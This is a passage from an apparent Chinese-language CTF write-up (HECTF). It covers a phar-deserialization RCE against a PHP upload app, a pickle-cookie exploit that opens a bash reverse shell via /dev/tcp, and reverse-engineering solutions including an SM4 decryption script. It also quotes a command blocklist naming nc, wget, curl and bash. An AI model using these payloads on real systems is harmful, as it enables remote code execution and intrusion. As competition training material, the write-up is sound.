class="title">file</span>))</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;surely exists&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span>   </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;dont exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>home.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;common.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;<span class="title">Welcome</span> <span class="title">to</span> <span class="title">HECTF</span> ！！！&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">Click</span> <span class="title">here</span> <span class="title">to</span> <span class="title">upload</span> <span class="title">your</span> <span class="title">file</span> =&gt; &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">show</span>=<span class="title">upload</span>&quot;&gt;传送门&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;common.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$fn</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$ft</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$fn</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">fatal</span>(<span class="string">&#x27;uploaded file corrupted&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/png&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ft</span>,<span class="variable">$array</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">fatal</span>(<span class="string">&quot;No, I want png picture ᵕ᷄ι ̠ᵕ᷅&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$imagekey</span> = <span class="title function_ invoke__">create_image_key</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$fn</span>, <span class="string">&quot;uploads/<span class="subst">$imagekey</span>.png&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ?show=show&amp;imagekey=<span class="subst">$imagekey</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;<span class="title">Plz</span> <span class="title">Give</span> <span class="title">me</span> <span class="title">a</span> <span class="title">file</span> <span class="title">I</span> <span class="title">want</span>.&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">action</span>=&quot;?<span class="title">show</span>=<span class="title">upload</span>&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">image</span>&quot;&gt;ᵕ᷄ι ̠ᵕ᷅    </span></span><br><span class="line"><span class="class"> &lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">id</span>=&quot;<span class="title">image</span>&quot; <span class="title">name</span>=&quot;<span class="title">image</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">br</span> /&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Upload</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure><p>common.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;FROM_INDEX&#x27;</span>)) <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MAX_IM_SIZE&#x27;</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_image_key</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>] . <span class="title function_ invoke__">time</span>() . <span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_image</span>(<span class="params"><span class="variable">$imagekey</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> !== <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9a-f]&#123;40&#125;/&#x27;</span>, <span class="variable">$imagekey</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">fatal</span>(<span class="string">&#x27;Invalid image key.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="string">&quot;uploads/<span class="subst">&#123;$imagekey&#125;</span>.png&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$im</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">fatal</span>(<span class="string">&#x27;Failed to load image.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$im</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hectf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hectf) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>,<span class="variable">$this</span>-&gt;hectf) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;hectf))</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;No no no no no!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审计源码，图片上传点+<code>file_exists()</code>函数+自定义<code>HeCTF</code>类，判断为文件上传+phar反序列化利用。</p><p><code>HeCTF</code>类中RCE使用 <code>tee</code> 命令绕过过滤写文件。</p><p>构造phar文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hectf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">HeCTF</span>();   </span><br><span class="line"><span class="variable">$o</span>-&gt;hectf = <span class="keyword">array</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd = <span class="string">&#x27;ls / | tee 1&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>将生成的phar文件改为png后缀上传，在index.php以POST方式传入file值，利用phar伪协议反序列化RCE：</p><p><code>POST: file=phar://uploads/25c3a34d93227241d5dacc8eb84a80ef2aabeab1.png</code></p><p>读到flag文件名 <code>/ffflllllaaaaggg</code>，同样操作构造读flag内容的phar文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hectf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">HeCTF</span>();   </span><br><span class="line"><span class="variable">$o</span>-&gt;hectf = <span class="keyword">array</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd = <span class="string">&#x27;cat /ffflllllaaaaggg | tee 1&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="皮扣的商店"><a href="#皮扣的商店" class="headerlink" title="皮扣的商店"></a>皮扣的商店</h3><p>进入页面发现可以点击按钮，但是没钱可用，点击时发现cookie是变化的。</p><p>cookie像base64，解码，结合题目可知为json的pickle序列化结果，反推一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(b64decode(enc)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&#x27;money&#x27;: 500, &#x27;history&#x27;: [], &#x27;anti_tamper_hmac&#x27;: &#x27;aa1ba4de55048cf20e0a7a63b7f8eb62&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>可见使用了hmac哈希，无法爆破，但可以构造RCE代码序列化后放入cookie，点击按钮执行恶意代码，由于页面无结果回显，构造反弹shell代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;bash -c \&quot;bash -i &gt; /dev/tcp/[IP]/[Port] 0&gt;&amp;1 2&gt;&amp;1\&quot;&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><p>替换cookie后，点击按钮即可在vps getshell拿flag。</p><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="贝斯"><a href="#贝斯" class="headerlink" title="贝斯"></a>贝斯</h3><p>变表base32，Cyberchef一把梭得到flag。</p><p>​    </p><h3 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h3><blockquote><p>如何分析Apk呢</p></blockquote><p>用jadx打开apk，在AndroidManifest.xml里发现：</p><p><code>&lt;meta-data android:name=&quot;父拉哥&quot; android:value=&quot;付拉哥头&#123;Apktool_or_jadx&#125;&quot;/&gt;</code></p><p>flag：<code>HECTF&#123;Apktool_or_jadx&#125;</code></p><p>​    </p><h3 id="HelloIos"><a href="#HelloIos" class="headerlink" title="HelloIos"></a>HelloIos</h3><blockquote><p>简单的ios</p></blockquote><p>找到关键加密函数，简单异或还原flag。</p><p>​    </p><h3 id="ezre"><a href="#ezre" class="headerlink" title="ezre"></a>ezre</h3><blockquote><p>easy reverse</p></blockquote><p>加密逻辑很难看，利用IDA的findcrypt插件可以识别出存在SM4加密算法的关键参数数组。</p><p>利用动调找到SM4加密使用的128位key值，导出hex：<code>AD763B4FCDCFD9251089FB0408A45F80</code>，以及128bit密文，导出hex：<code>D75CDA22176DD392A1A570915F66A61C</code>。</p><p>找一个SM4算法的python脚本解密得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SM4Cipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(key) == <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;SM4 key must be length of 16. &quot;</span>)</span><br><span class="line">        self._key_r = self._generate_key(key)</span><br><span class="line">        self.block_size = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, plaintext: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self._do(plaintext, self._key_r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ciphertext: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self._do(ciphertext, self._key_r[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_do</span>(<span class="params">self, text: <span class="built_in">bytes</span>, key_r: <span class="built_in">list</span></span>):</span><br><span class="line">        text_ = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        <span class="comment"># 将 128bit 转化成 4x32bit</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            text_[i] = <span class="built_in">int</span>.from_bytes(text[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            box_in = text_[<span class="number">1</span>] ^ text_[<span class="number">2</span>] ^ text_[<span class="number">3</span>] ^ key_r[i]</span><br><span class="line">            box_out = self._s_box(box_in)</span><br><span class="line">            temp = text_[<span class="number">0</span>] ^ box_out ^ self._rot_left(box_out, <span class="number">2</span>) ^ self._rot_left(box_out, <span class="number">10</span>)</span><br><span class="line">            temp = temp ^ self._rot_left(box_out, <span class="number">18</span>) ^ self._rot_left(box_out, <span class="number">24</span>)</span><br><span class="line">            text_ = text_[<span class="number">1</span>:] + [temp]</span><br><span class="line">        text_ = text_[::-<span class="number">1</span>]  <span class="comment"># 结果逆序</span></span><br><span class="line">        <span class="comment"># 将 4x32bit 合并成 128bit</span></span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            result.extend(text_[i].to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_generate_key</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;密钥生成&quot;&quot;&quot;</span></span><br><span class="line">        key_r, key_temp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)], [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        FK = [<span class="number">0xa3b1bac6</span>, <span class="number">0x56aa3350</span>, <span class="number">0x677d9197</span>, <span class="number">0xb27022dc</span>]</span><br><span class="line">        CK = [<span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>, <span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line">              <span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span class="number">0x181f262d</span>, <span class="number">0x343b4249</span>, <span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span class="number">0xa4abb2b9</span>,</span><br><span class="line">              <span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>, <span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line">              <span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>, <span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span>]</span><br><span class="line">        <span class="comment"># 将 128bit 拆分成 4x32bit</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            temp = <span class="built_in">int</span>.from_bytes(key[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            key_temp[i] = temp ^ FK[i]</span><br><span class="line">        <span class="comment"># 循环生成轮密钥</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            box_in = key_temp[<span class="number">1</span>] ^ key_temp[<span class="number">2</span>] ^ key_temp[<span class="number">3</span>] ^ CK[i]</span><br><span class="line">            box_out = self._s_box(box_in)</span><br><span class="line">            key_r[i] = key_temp[<span class="number">0</span>] ^ box_out ^ self._rot_left(box_out, <span class="number">13</span>) ^ self._rot_left(box_out, <span class="number">23</span>)</span><br><span class="line">            key_temp = key_temp[<span class="number">1</span>:] + [key_r[i]]</span><br><span class="line">        <span class="keyword">return</span> key_r</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_s_box</span>(<span class="params">n: <span class="built_in">int</span></span>):</span><br><span class="line">        BOX = [<span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0x2B</span>,</span><br><span class="line">               <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>,</span><br><span class="line">               <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span 